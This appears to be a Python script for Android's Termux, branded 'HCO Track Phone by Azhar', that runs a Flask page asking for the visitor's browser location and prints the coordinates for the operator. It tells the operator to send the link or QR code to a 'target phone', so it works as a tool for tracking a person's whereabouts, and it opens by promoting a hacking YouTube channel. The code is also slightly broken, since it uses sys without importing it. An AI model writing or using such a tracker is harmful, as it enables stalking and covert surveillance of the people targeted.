# HCO Track Phone by Azhar
# Simple Version - Just run and it works!

import os
import subprocess
import threading
import time
import socket
import requests
from flask import Flask, request, render_template_string, jsonify

# Color codes
RED = "\033[1;91m"
GREEN = "\033[1;92m"
CYAN = "\033[1;96m"
YELLOW = "\033[1;93m"
BLUE = "\033[1;94m"
RESET = "\033[0m"

locations = {}
app = Flask(__name__)
TRACKING_URL = ""

# Tool lock message
def tool_lock():
    os.system('clear')
    print(f"{RED}╔{'═'*78}╗{RESET}")
    print(f"{RED}║{'🔒 TOOL LOCKED 🔒'.center(78)}║{RESET}")
    print(f"{RED}║{'Subscribe to YouTube Channel'.center(78)}║{RESET}")
    print(f"{RED}║{'@hackers_colony_tech'.center(78)}║{RESET}")
    print(f"{RED}╚{'═'*78}╝{RESET}")
    print(f"\n{CYAN}Opening YouTube in 3 seconds...{RESET}")
    time.sleep(3)
    
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", 
                       "-d", "https://youtube.com/@hackers_colony_tech"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    
    input(f"\n{YELLOW}Press ENTER to continue...{RESET}")

# Find available port
def find_port():
    for port in range(8080, 8100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(('0.0.0.0', port))
                return port
            except:
                continue
    return 8080

# Get local IP
def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"

# Flask routes
@app.route('/')
def home():
    html = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>HCO Track Phone</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <style>
            body { background: black; color: lime; text-align: center; font-family: Arial; padding: 20px; }
            .container { max-width: 500px; margin: 0 auto; border: 2px solid lime; border-radius: 10px; padding: 20px; }
            .logo { color: red; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
            button { background: lime; color: black; border: none; padding: 15px 30px; border-radius: 5px; font-size: 18px; font-weight: bold; margin: 20px 0; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="logo">HCO TRACK PHONE BY AZHAR</div>
            <p>Click below to share your location</p>
            <button onclick="shareLocation()">📡 SHARE LOCATION</button>
            <p id="status">Ready to track...</p>
        </div>
        
        <script>
        function shareLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    fetch('/update', {
                        method: 'POST',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({
                            lat: position.coords.latitude,
                            lon: position.coords.longitude,
                            accuracy: position.coords.accuracy
                        })
                    });
                    document.getElementById('status').innerHTML = '✅ Location sent!';
                }, function(error) {
                    document.getElementById('status').innerHTML = '❌ Please allow location access';
                });
            } else {
                document.getElementById('status').innerHTML = '❌ Geolocation not supported';
            }
        }
        </script>
    </body>
    </html>
    """
    return render_template_string(html)

@app.route('/update', methods=['POST'])
def update():
    data = request.json
    if data and 'lat' in data and 'lon' in data:
        locations.update(data)
        locations['time'] = time.time()
        print(f"{GREEN}📍 Location received: {data['lat']}, {data['lon']}{RESET}")
        return "OK"
    return "ERROR"

def start_server(port):
    app.run(host='0.0.0.0', port=port, debug=False, use_reloader=False)

# Generate QR code
def make_qr(url):
    try:
        import qrcode
        qr = qrcode.QRCode(box_size=2, border=2)
        qr.add_data(url)
        qr.make()
        img = qr.make_image(fill_color="red", back_color="black")
        img.save("/data/data/com.termux/files/home/track_qr.png")
        print(f"{GREEN}✅ QR code generated!{RESET}")
    except:
        print(f"{YELLOW}⚠️  QR code failed, but link will work{RESET}")

# Main function
def main():
    # Show tool lock
    tool_lock()
    
    # Clear screen
    os.system('clear')
    
    print(f"{GREEN}🚀 Starting HCO Track Phone...{RESET}")
    print(f"{YELLOW}Please wait while we set things up...{RESET}")
    
    # Install required packages
    try:
        subprocess.run([sys.executable, "-m", "pip", "install", "flask", "qrcode[pil]", "requests"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{GREEN}✅ Packages installed{RESET}")
    except:
        print(f"{YELLOW}⚠️  Some packages might need manual installation{RESET}")
    
    # Start server
    port = find_port()
    local_ip = get_ip()
    TRACKING_URL = f"http://{local_ip}:{port}"
    
    print(f"{GREEN}✅ Server starting on port {port}{RESET}")
    
    # Start server in thread
    server_thread = threading.Thread(target=start_server, args=(port,), daemon=True)
    server_thread.start()
    
    time.sleep(2)  # Wait for server to start
    
    # Generate QR code
    make_qr(TRACKING_URL)
    
    # Show banner
    print(f"\n{RED}{'═'*60}{RESET}")
    print(f"{RED}{'HCO TRACK PHONE BY AZHAR'.center(60)}{RESET}")
    print(f"{RED}{'═'*60}{RESET}")
    print(f"\n{GREEN}📱 Send this link to target phone:{RESET}")
    print(f"{CYAN}{TRACKING_URL}{RESET}")
    print(f"\n{YELLOW}📍 OR scan the QR code that opened{RESET}")
    print(f"\n{RED}{'═'*60}{RESET}")
    
    # Try to open QR code
    try:
        subprocess.run(["termux-open", "/data/data/com.termux/files/home/track_qr.png"],
                      stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except:
        pass
    
    # Wait for location
    print(f"\n{YELLOW}⏳ Waiting for location...{RESET}")
    print(f"{BLUE}Press Ctrl+C to stop{RESET}")
    
    last_time = 0
    while True:
        if 'time' in locations and locations['time'] > last_time:
            last_time = locations['time']
            print(f"\n{GREEN}✅ LOCATION RECEIVED!{RESET}")
            print(f"{GREEN}Latitude: {locations['lat']}{RESET}")
            print(f"{GREEN}Longitude: {locations['lon']}{RESET}")
            print(f"{GREEN}Accuracy: {locations.get('accuracy', 'N/A')}m{RESET}")
            print(f"{GREEN}Google Maps: https://maps.google.com/?q={locations['lat']},{locations['lon']}{RESET}")
        
        time.sleep(2)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}🛑 Stopped{RESET}")
    except Exception as e:
        print(f"{RED}❌ Error: {e}{RESET}")
        print(f"{YELLOW}Try: pkg install python && pip install flask requests qrcode[pil]{RESET}")
